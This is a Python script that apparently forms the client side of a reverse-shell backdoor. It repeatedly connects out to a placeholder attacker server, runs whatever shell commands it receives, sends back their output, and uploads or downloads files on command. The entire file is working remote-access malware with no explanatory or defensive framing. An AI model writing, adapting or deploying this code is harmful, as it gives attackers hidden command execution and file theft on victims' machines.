import socket
import json
import subprocess
import time
import os
def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()
def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
def connection():
    while True:
        time.sleep(4)
        try:
            s.connect(('ipserver', portserver))
            shell()
            s.close()
            break
        except:
            connection()
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        if command[:3] == 'res ':
            reliable_send(True)
            break
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin = subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def catc():
    try:
      connection()
    except KeyboardInterrupt:
      quit()
catc()


